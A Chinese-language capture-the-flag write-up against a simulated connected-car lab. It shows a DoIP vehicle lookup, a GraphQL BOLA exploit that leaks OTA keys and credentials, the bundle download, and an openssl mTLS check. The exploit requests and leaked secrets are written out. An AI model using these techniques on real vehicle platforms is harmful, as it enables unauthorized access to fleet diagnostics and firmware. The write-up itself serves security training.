# 任务 01：云侧对象级越权与 OTA 定位

- **靶机轮次**：2026-11-14 第二轮（门户重启后）
- **入口**：TSP `http://10.225.139.2:8080/graphql`；车辆识别 `10.226.193.2:13400`（DoIP）
- **结论**：通过 TSP GraphQL 的**对象级授权缺陷**，仅凭 VIN 即取得目标车辆的 campaign、OTA 工程包下载路径、诊断入口、工程包凭据与包密钥；工程包下载后内含 **mTLS 诊断客户端证书**，已实测打通 `https://10.225.139.3:8443`（TLS1.3，verify OK）。

## 1. 识别目标车辆（DoIP / ISO 13400-2）

```
TCP 10.226.193.2:13400
→ vehicle identification request (0x0001)
← 0x0004  VIN = CV622697F82A936A1
           logical address = 0x1000
           EID = 060000001000  GID = 000000000000
```

辅助读取：`22 F190` 返回同一 VIN；`22 F1A0` 返回 `07E0 07E8 07E1 07E9`（两条 CAN 诊断 ID 对）。

## 2. TSP 对象级越权（BOLA）

### 2.1 接口的真实行为

`/graphql` 并不是一台通用 GraphQL 引擎，而是一台**按「字段名 + variables」查表的匹配器**：

- 无匹配 → 恒定回退到 guest 数据：
  `{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}`
- 命中 `vehicleDiagnostics` 且 `variables.vin` 是**已登记 VIN** → 返回该车的诊断对象。

关键判据（`03_EVIDENCE/tsp/0100_vehicleDiagnostics_target.json`）：

| 请求 | 结果 |
|---|---|
| `{"query":"query { vehicleDiagnostics(vin:\"CV622697F82A936A1\") { vin } }"}`（无 variables） | guest 回退 |
| `{"query":"query { vehicleDiagnostics { vin } }","variables":{"vin":"CV622697F82A936A1"}}`（query 里**不带参数**） | **返回真实诊断对象** |
| `{"query":"{vehicles{vin}}","variables":{"vin":"CV622697F82A936A1"}}` | guest 回退（字段名必须匹配） |
| 换 `CV6000000DEMO0001` / `CV685aaaa` / `CV611111111` | guest 回退（未登记 VIN） |

⇒ **匹配键是 `variables.vin`，query 里的 `(vin: ...)` 参数只是幌子。**
⇒ **缺陷**：接口无任何身份/归属校验，任何未认证客户端只要知道一个已登记 VIN，就能读取该车的云端 OTA 与诊断配置。

### 2.2 越权取得的对象

```json
{"data":{"vehicleDiagnostics":{
  "campaignId":"CAMP-243892C376D4CB2D5F826953",
  "diagnosticEndpoint":"https://tbox:8443",
  "firmwareCredential":"5e7f07b4a81153ecd5868cc02557f823",
  "firmwareDownload":"/api/v1/ota/engineering-bundle",
  "manifest":"ZIP; AES-256-GCM T-BOX image; mTLS diagnostic bundle; VCU reference image",
  "packageKey":"3ac02bb40567fa14062cc768e22fefac3dd972aee87a3bf2d01419f026d573d0",
  "tboxEndpoint":"http://tbox:8080",
  "vin":"CV622697F82A936A1"
}}}
```

对应任务要求的三个产出：

| 要求 | 取得值 |
|---|---|
| campaign | `CAMP-243892C376D4CB2D5F826953` |
| OTA 工程资源 | `http://10.225.139.3:8080/api/v1/ota/engineering-bundle`（+ `packageKey`/`firmwareCredential`） |
| 诊断入口 | `https://10.225.139.3:8443`（mTLS，`CN=CV6 Engineering Diagnostic Client`） |

## 3. 下载 OTA 工程包

`/api/v1/ota/engineering-bundle`（T-BOX 8080）要求 HTTP Basic，realm `CV6 OTA`：

```
Basic  diag : <firmwareCredential>          → 200, application/zip
```

> 凭据用户名为 `diag`，密码为 TSP 返回的 `firmwareCredential`。错误组合恒回
> `401 {"error":"invalid credentials"}`，无用户名枚举差异。

包内容（`cv6-engineering-bundle.zip`，约 19.6 KB）：

| 文件 | 大小 | 说明 |
|---|---|---|
| `manifest.json` | 350 B | `AES-256-GCM` / `CV6-OTA-1` / nonce / `tboxAddress 0x08000000` / `tboxSha256` / `tboxSize 16384` / `vcuReferenceSize 1024` / `vcuRollback 2` / `vcuUpdateAddress 0x08040000` |
| `vcu-reference.bin` | 1024 B | VCU 参考镜像，magic `CV6VCU1` |
| `tbox-firmware.img` | 16412 B | AES-256-GCM 加密的 T-BOX 镜像 |
| `diagnostics/ca.pem` | 595 B | `CN=CV6 Fleet Diagnostics Root`（自签根） |
| `diagnostics/client.pem` | 611 B | `CN=CV6 Engineering Diagnostic Client`，EKU=clientAuth |
| `diagnostics/client-key.pem` | 241 B | 与 client.pem 公钥匹配（MD5 一致） |

**注意**：工程包**按请求动态生成**——两次下载的 `nonce` 与客户端证书 `notBefore` 都不同，
诊断证书是"每次下载现签"的，因此不存在可复用的静态 mTLS 材质。

## 4. 诊断入口验证（mTLS）

```
openssl s_client -connect 10.225.139.3:8443 \
  -cert diagnostics/client.pem -key diagnostics/client-key.pem -CAfile diagnostics/ca.pem -servername tbox
→ Protocol: TLSv1.3, Cipher TLS_AES_128_GCM_SHA256
→ Verify return code: 0 (ok)
→ HTTP/1.1 404 (服务在线，路由面留待任务 02)
```

## 5. 复现

```bash
python 04_SOLVE/task01/solve_task01.py
```

脚本自 DoIP 识别开始，依次完成：取 VIN → 越权查询 → 下载 → 解包 → mTLS 验证，
产物落在 `06_WRITEUP/01-tsp-bola/artifacts/`。

## 6. 证据索引

| 文件 | 内容 |
|---|---|
| `03_EVIDENCE/tsp/0100_vehicleDiagnostics_target.json` | 越权查询原始响应 |
| `03_EVIDENCE/tsp/0104_bundle_headers.txt` | 工程包下载响应头 |
| `03_EVIDENCE/tsp/0105_engineering-bundle.bin` | 工程包原件（sha256 见下） |
| `03_EVIDENCE/tsp/bundle/extracted/` | 解包后的 6 个文件 |
| `06_WRITEUP/01-tsp-bola/artifacts/task01_result.json` | 端到端结果汇总 |
| `06_WRITEUP/01-tsp-bola/artifacts/cv6-engineering-bundle.zip` | 复现脚本下载的包 |

## 7. 判据与边界

- **已验证**：VIN 识别、越权查询、工程包下载、解包内容、mTLS 握手成功（均为实测）。
- **未验证**：8443 内的具体业务路由（任务 02 范围）；工程包内 T-BOX 固件的 AES-256-GCM 解密（任务 02/06 范围）。
- **风险提示**：`packageKey` 与 `firmwareCredential` 已落盘，属敏感材料，交付时按需脱敏。
